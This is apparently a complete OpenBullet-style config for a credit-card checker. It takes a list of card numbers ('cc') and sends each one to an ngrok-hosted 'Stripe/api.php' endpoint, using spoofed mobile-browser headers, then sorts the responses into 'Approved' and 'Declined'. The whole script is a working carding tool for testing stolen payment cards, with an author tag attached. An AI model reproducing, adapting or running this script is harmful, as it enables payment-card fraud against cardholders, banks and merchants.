[SCRIPT]
FUNCTION URLDecode "<USER>" -> VAR "cc" 

REQUEST GET "https://deadstripe.ngrok.io/Stripe/api.php?lista=<cc>" 
  
  HEADER ": scheme: https" 
  HEADER "accept: */*" 
  HEADER "accept-encoding: gzip, deflate, br" 
  HEADER "accept-language: en-US,en;q=0.9" 
  HEADER "referer: https://deadstripe.ngrok.io/Stripe/" 
  HEADER "sec-fetch-dest: empty" 
  HEADER "sec-fetch-mode: cors" 
  HEADER "sec-fetch-site: same-origin" 
  HEADER "sec-gpc: 1" 
  HEADER "user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Mobile Safari/537.36" 
  HEADER "x-requested-with: XMLHttpRequest" 

KEYCHECK 
  KEYCHAIN Failure OR 
    KEY "#Declined" 
    KEY "Card Declined" 
  KEYCHAIN Success OR 
    KEY "#Approved" 

FUNCTION Constant "@uzzzul" -> CAP "by" 

